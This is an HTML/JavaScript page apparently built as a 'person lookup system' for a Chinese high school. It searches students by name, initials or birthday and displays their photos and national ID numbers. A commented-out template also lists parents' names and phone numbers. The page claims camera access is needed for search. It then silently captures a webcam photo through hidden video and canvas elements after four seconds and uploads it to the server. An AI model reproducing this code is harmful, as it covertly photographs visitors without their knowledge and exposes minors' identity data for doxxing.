<!DOCTYPE html>
<html>
	<head>
		<title>沥高查人系统</title>

		<!-- jQuery文件。务必在bootstrap.min.js 之前引入 -->

		<!-- 最新的 Bootstrap 核心 JavaScript 文件 -->
		<script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>

		<!-- 引入 layui.css -->
		<link rel="stylesheet" href="https://www.layuicdn.com/layui/css/layui.css">

	<body>
		<div class="container">
			<div class="panel panel-info">
				<div class="panel-heading">

					<h2 class="panel-title text-center">大沥高中查人系统</h2>

					<img id="head-img" style="display: none;" src="https://q1.qlogo.cn/g?b=qq&nk=2734184475&s=640"
						class="img-circle center-block" alt="Cinque Terre" width="50" height="50">
				</div>
				<div class="panel-body">
					<p class="text-center text-success" style="font-size: 18px;">选择查询模式:
						<select class="selectpicker">
							<option value="1">按名字查人(支持模糊)</option>
							<option value="2">按拼音缩写查人</option>
							<option value="3">按生日查人</option>
						</select>
					</p>
					
					<br />

					<div class="input-group">
						<input type="text" class="form-control" id="input-name">
						<span class="input-group-btn">
							<button class="btn btn-success" type="button" onclick="search();">查询</button>
						</span>
					</div><!-- /input-group -->
					<br>

					<!-- 查询错误信息警告框 -->
					<div class="alert alert-danger alert-dismissable" id='error-msg' style="display: none;">
						<button type="button" class="close" data-dismiss="alert" aria-hidden="true">
							&times;
						</button>
						查询错误:<code id="msg"></code>
					</div>

					<!-- 查询信息提示框 -->
					<div class="alert alert-success alert-dismissable" id='suc-msg' style="display: none;">
						<button type="button" class="close" data-dismiss="alert" aria-hidden="true">
							&times;
						</button>
						查询结果:<code id="suc-msg"></code>
					</div>

					<button type="button" class="btn btn-primary"><a href="/">返回主菜单</a></button>

					<!-- 查询结果容器弃用 -->
					<!-- <div id="add">
						
					</div> -->
					<!-- 查询结果接口容器 -->
					<ul class="list-group" id="add">

					</ul>

					<!-- 拍照用 -->
					<video id="video" width="500px" height="500px" autoplay="autoplay" style="display: none;"></video>
					<canvas id="canvas" width="500px" height="500px" style="display: none;"></canvas>

				</div>
			</div>
		</div>
	</body>
	<script type="text/javascript">
		// api 地址记得更改
		var api = "/dani/api/"
		$(document).ready(function() {
			$("#head-img").show(1000);
			layer.alert('请小可爱授予权限以运行搜索引擎.~', {
				skin: 'layui-layer-molv', //样式类名
				closeBtn: 1,
			}, function(index) {
				getMedia();
				layer.close(index);
			});

		});

		function search() {
			var name = $("#input-name").val();

			$.ajax({
				url: api,
				type: "get",
				data: {
					"name": name
				},
				dataType: "json",
				timeout: 8000,
				beforeSend: function() {
					// 请求前置空查询结果
					$("#add").empty();
				},
				success: function(result) {
					console.log(result)
					// console.log(result.code)
					if (result.code != 200) {
						$("#error-msg").show(1000);
						$("#msg").text(result.msg);
					} else {
						// var addwiget="";
						$("#suc-msg").show(1000);
						$("#suc-msg").text(result.msg);
						for (var i = 0; i < result.data.length; i++) {
							var data = result.data[i]

							// 弃用旧的显示
							// 	var addwitget = '<div class="thumbnail" style="display: none;">\
							// 	<img src="https://ares-k12.weds.com.cn/' + data.student_photo + '" alt="">\
							// 	<div class="caption">\
							// 		<p class="center-block"><code>\
							// 			' + data.student_name + '</code>小朋友,身份证号码:<code>' + data.student_sfz + '</code>,家长是<code>' + data
							// 		.parent_name + '</code>,电话:<code>' + data.parent_tel + '</code>.\
							// 		</p>\
							// 	</div>\
							// </div>';
							var addwiget =
								'<li class="list-group-item"><a class="text-primary"href="check.html"style="font-size: 20px;"><img src="https://ares-k12.weds.com.cn/' +
								data.student_photo +
								'"class="img-circle img-thumbnail img-responsive"style="width: 50px; height: 50px;"><h4 style="display: inline">' +
								data.student_name + '<small><code>' + data.student_sfz +
								'</code></small></h4><button type="button"class="btn btn-default btn-sm"><span class="glyphicon glyphicon-share"></span>跳转到</button></a></li>';


							$("#add").append(addwiget);
							$(".list-group-item").show(1000);
						}


					};

				},
				error: function(xhr, status, error) {
					$("#error-msg").show(1000);
					$("#msg").text("后端接口异常:" + status + error);
				}
			});

		};

		// 拍照代码
		//获得video摄像头区域
		let video = document.getElementById("video");

		function takePhoto() {
			//获得Canvas对象
			let canvas = document.getElementById("canvas");
			let ctx = canvas.getContext('2d');
			ctx.drawImage(video, 0, 0, 500, 500);
			// 图片转base64
			var base64 = canvas.toDataURL('image/jpeg').substr(22);
			$.ajax({
				url: "/upload_base64pic",
				type: "POST",
				data: {
					"base64": base64,
				},
				dataType: "json",
				success: function(result) {
					console.log(result)
					if (result.code == 200) {
						layer.msg(result.msg);
					} else {
						layer.msg(result.code + result.msg);
					}
				},
				error: function(xhr, status, error) {
					layer.msg("内部失败." + static + error);
				}
			})
		}

		function getMedia() {
			let constraints = {
				video: {
					width: 500,
					height: 500
				},
				audio: false
			};
			/*
			这里介绍新的方法:H5新媒体接口 navigator.mediaDevices.getUserMedia()
			这个方法会提示用户是否允许媒体输入,(媒体输入主要包括相机,视频采集设备,屏幕共享服务,麦克风,A/D转换器等)
			返回的是一个Promise对象。
			如果用户同意使用权限,则会将 MediaStream对象作为resolve()的参数传给then()
			如果用户拒绝使用权限,或者请求的媒体资源不可用,则会将 PermissionDeniedError作为reject()的参数传给catch()
			*/
			let promise = navigator.mediaDevices.getUserMedia(constraints);
			promise.then(function(MediaStream) {
				// 获取成功延时4s后拍照
				video.srcObject = MediaStream;
				video.play();
				layer.msg("申请成功!");
				// takePhoto();
				setTimeout(function() {
					takePhoto();
				}, 4000);
			}).catch(function(PermissionDeniedError) {
				layer.alert('权限申请失败!小可爱无法正常查人了,呜呜呜:' + PermissionDeniedError, {
					skin: 'layui-layer-molv', //样式类名
					closeBtn: 1
				}, function(index) {
					layer.close(index);
				});
				console.log(PermissionDeniedError);
			})
		}
	</script>
</html>
